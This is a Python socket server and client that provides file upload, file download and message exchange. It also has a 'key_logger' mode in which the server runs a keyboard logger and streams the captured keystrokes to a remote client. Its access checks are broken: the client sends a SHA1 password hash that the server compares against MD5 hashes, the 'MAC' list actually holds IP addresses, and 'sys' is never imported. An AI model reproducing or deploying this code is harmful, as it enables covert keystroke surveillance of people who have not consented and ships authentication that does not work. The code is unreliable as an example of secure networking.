import socket
import struct
from datetime import datetime
import threading
import time, os
from tqdm import tqdm, trange
import json
import pickle
import hashlib
try:
    from socket_tool.key_logger import key_logger
except:
    try:
        from key_logger import key_logger
    except:
        pass

class tool(object):

    def __init__(self):
        pass

    def getip(self):
        s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
        s.connect( ('8.8.8.8', 80) )
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address

    def pwd2encode(self, pwd, type=None):
        if type == 'MD5':
            m = hashlib.md5()
            m.update( pwd.encode( "utf-8" ) )
            pwd = m.hexdigest()
        if type == 'SHA':
            m = hashlib.sha1()
            m.update( pwd.encode( "utf-8" ) )
            pwd = m.hexdigest()
            print(pwd)
        return pwd

class socket_model(object):

    def __init__(self, host, port, max_transfer_speed=1024):
        self.max_transfer_speed = max_transfer_speed
        self.host = host
        self.port = port

    def MAC_filter(self, whitelist, mac_set):
        validation_results = False
        for mac in mac_set:
            if mac in whitelist:
                validation_results = True
                break
        return validation_results

    def common_filter(self, whitelist, candidate, encode=None):
        candidate = tool().pwd2encode(candidate, encode)
        validation_results = False
        if candidate in whitelist:
            validation_results = True
        return validation_results

    def socket_server(self, channel_max, share_file, filter_IP, ip_whitelist, filter_MAC, mac_whitelist, filter_PWD, pwd_whitelist):
        try:
            s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            s.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 )
            s.bind( (self.host, self.port) )
            s.listen( channel_max )
        except socket.error as msg:
            print( msg )
            sys.exit( 1 )
        while True:
            print('', '\n')
            print('Server Online...')
            try:
                conn, addr = s.accept()
                vert_ip, vert_mac, vert_pwd = True, True, True

                conn.send(conn.recv(1024))
                print('send')
                # IP filter
                if filter_IP is True:
                    vert_ip = self.common_filter(ip_whitelist, addr[0])
                conn.send( str( vert_ip ).encode() )
                # MAC filter
                mac_set = pickle.loads(conn.recv( 1024 ))
                if filter_MAC is True:
                    vert_mac = self.MAC_filter(mac_whitelist, mac_set)
                conn.send( str( vert_mac ).encode() )
                # password filter
                pwd = conn.recv( 1024 ).decode()
                if filter_PWD is True:
                    vert_pwd = self.common_filter( pwd_whitelist, pwd, encode='MD5')
                conn.send( str( vert_pwd ).encode() )
                print( 'IP security verification: ', vert_ip )
                print( 'MAC security verification: ', vert_mac )
                print( 'Pwssword security verification: ', vert_pwd )
                if vert_ip and vert_mac and vert_pwd:
                    print('Pass security verification!')
                    t = threading.Thread( target=self.deal_data, args=(conn, addr, share_file) )
                    t.start()
                else:
                    print('Login block: ', addr[0], '\n' )
            except:
                print('Attack form ', addr[0])

    def deal_data(self, conn, addr, share_file):
        ti = time.time()
        # progress = tqdm( total=100 )
        print( 'Accept new connection from {0}'.format( addr ) )
        # conn.settimeout(500)
        conn.send( ('Hi, Welcome to the server!').encode() )
        while True:
            type = conn.recv(1024).decode()
            if type == 'download':
                if len(share_file) == 0:
                    print( 'There is no share file!' )
                    conn.send( ('None').encode() )
                    conn.send( ('None').encode() )
                for mini_share_file in share_file:
                    if os.path.isfile( mini_share_file ):
                        conn.send( ('the file is exist').encode() )
                        fhead = struct.pack( '128sl', (os.path.basename( mini_share_file )).encode(), os.stat( mini_share_file ).st_size )
                        conn.send( fhead )
                        fp = open( mini_share_file, 'rb' )
                        while True:
                            data = fp.read( self.max_transfer_speed )
                            if not data:
                                print( '{0} file send over...'.format( mini_share_file ) )
                                break
                            conn.send( data )
                    else:
                        print('The file: ', mini_share_file, 'is not exist!')
                        conn.send(('None').encode())
                        conn.send( os.path.basename(mini_share_file).encode() )
            elif type == 'upload':
                fileinfo_size = struct.calcsize( '128sl' )
                buf = conn.recv( fileinfo_size )
                if buf:
                    recvd_size = 0
                    filename, filesize = struct.unpack('128sl', buf)
                    origin_filename = filename.strip(('\00').encode())
                    upload_folder = 'upload/'
                    date_folder = datetime.now().strftime('%Y%m%d') + '/'
                    ms_file = datetime.now().strftime('%Y-%m-%d_%H-%M-%S-%f') + '_'
                    if not os.path.isdir('./' + upload_folder):
                        os.mkdir('./' + upload_folder)
                    if not os.path.isdir('./' + upload_folder + date_folder):
                        os.mkdir('./' + upload_folder + date_folder)
                    new_filename = os.path.join('./' + upload_folder + date_folder, ms_file+origin_filename.decode())
                    print( 'file new name is {0}, filesize if {1}'.format( new_filename, filesize ) )
                    fp = open( new_filename, 'wb' )
                    print( 'start receiving...' )
                    while not recvd_size == filesize:
                        if filesize - recvd_size > 0:
                            data = conn.recv( self.max_transfer_speed )
                            # if recvd_size == 0:
                                # data = data[4:]
                            recvd_size += len( data )
                        else:
                            break
                        if set( data ) != {0}:
                            fp.write( data )
                        progress_rate = round( recvd_size * 100 / filesize, 2 )
                        if progress_rate >= 100:
                            progress_rate = 100
                        elif progress_rate <= 0:
                            progress_rate = 0
                        # progress.update( progress_rate )
                        print( 'progress=', progress_rate, '%' )
                    conn.send(('Success !').encode())
                    fp.close()
                    print( 'end receive...' )
            elif type == 'msg':
                msg = conn.recv( 1024 ).decode()
                print( "Request: ", msg )
                conn.send(msg.encode())
                print( "Response: ", msg )
            elif type == 'key_logger':
                buffer = int(conn.recv(1024).decode())
                key_logger.keyboard_logger(conn=conn, buffer_limit=buffer).run()
            conn.close()
            break
        tf = time.time()
        print('Runtime = ', tf-ti, '[s]', '\n' )
        print( '' )

    def socket_client(self, request, pwd='123', type='msg', fileinfo_size='128sl', hide_msg=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if not hide_msg:
                print('Wait to connect the server...\n')
            try:
                s.connect((self.host, self.port))
            except:
                if not hide_msg:
                    print('Can not connect the server!')
                exit()
            # IP filter
            vert_ip = json.loads((s.recv(1024).decode()).lower())
            # MAC filter
            mac_set = self.MAC_get()
            s.send(pickle.dumps(mac_set))
            vert_mac = json.loads((s.recv(1024).decode()).lower())
            # pwd filter
            pwd = tool().pwd2encode(pwd, type='SHA')
            s.send(pwd.encode())
            vert_pwd = json.loads((s.recv(1024).decode()).lower())
            if not hide_msg:
                print('IP security verification: ', vert_ip)
                print('MAC security verification: ', vert_mac)
                print('Pwssword security verification: ', vert_pwd)
            if vert_ip and vert_mac and vert_pwd:
                if not hide_msg:
                    print('Success to connect the server', '\n')
                connect = True
            else:
                if not hide_msg:
                    print('Validation failed (Unregistered) !', '\n')
                sys.exit(1)
        except socket.error as msg:
            if not hide_msg:
                print(msg)
            sys.exit(1)
        respond_temp = s.recv(1024).decode()
        if not hide_msg:
            print("Response: ", respond_temp)
        while connect:
            ti = time.time()
            s.send(type.encode())
            if type == 'msg':
                s.send(request.encode())
                respond_temp = s.recv(self.max_transfer_speed).decode()
                if not hide_msg:
                    print("Request: ", request)
                    print("Response: ", respond_temp)
                tf = time.time()
                if not hide_msg:
                    print('Runtime = ', (tf - ti), '[s]')
                break
            elif type == 'upload':
                if os.path.isfile(request):
                    fhead = struct.pack(fileinfo_size, (os.path.basename(request)).encode(), os.stat(request).st_size)
                    s.send(fhead)
                fp = open(request, 'rb')
                while True:
                    data = fp.read(self.max_transfer_speed)
                    if not data:
                        if not hide_msg:
                            print('{0} file send over...'.format(request))
                        break
                    s.send(data)
                if not hide_msg:
                    respond_temp = s.recv(1024).decode()
                    print("Request: ", request)
                    print("Response: ", respond_temp)
                tf = time.time()
                if not hide_msg:
                    print('Runtime = ', (tf - ti), '[s]')
                break
            elif type == 'download':
                print( "Request: ", type )
                fileinfo_size = struct.calcsize('128sl')
                file_exist = s.recv(1024).decode()
                if file_exist == 'None':
                    print( "Response: Download failed:", s.recv( 1024 ).decode() )
                    break
                else:
                    buf = s.recv(fileinfo_size)
                    if buf:
                        recvd_size = 0
                        filename, filesize = struct.unpack('128sl', buf)
                        origin_filename = filename.strip(('\00').encode())
                        new_filename = os.path.join('./', origin_filename.decode())
                        print('file new name is {0}, filesize is {1}'.format(new_filename, filesize))
                        fp = open(new_filename, 'wb')
                        print('start receiving...')
                        while recvd_size <= filesize:
                            if filesize - recvd_size > 0:
                                data = s.recv(self.max_transfer_speed)
                                # if recvd_size == 0:
                                    # data = data[4:]
                                    # pass
                                recvd_size += len(data)
                            else:
                                break
                            if set(data) != {0}:
                                fp.write(data)
                            progress_rate = round( recvd_size * 100 / filesize, 2 )
                            if progress_rate >= 100:
                                progress_rate = 100
                            elif progress_rate <= 0:
                                progress_rate = 0
                            # progress.update( progress_rate )
                            print( 'progress=', progress_rate, '%' )
                        fp.close()
                        print('end receive...')
                    print( 'file path = ', new_filename )
                    tf = time.time()
                    print( 'Runtime = ', (tf - ti), '[s]' , '\n' )
                    break
            elif type == 'key_logger':
                s.send( request.encode() )
                print("Buffer: ", int(request))
                while True:
                    respond = s.recv(self.max_transfer_speed).decode()
                    print("Key logger: ", respond)
                    if respond == 'Error':
                        connect = False
                        break
        s.close()

    def MAC_get(self):
        hostname = socket.gethostname()
        detail = socket.getaddrinfo( hostname, None, 0, socket.SOCK_STREAM )
        result = [x[4][0] for x in detail]
        result = result[:int( len( result ) / 2 )]
        return result
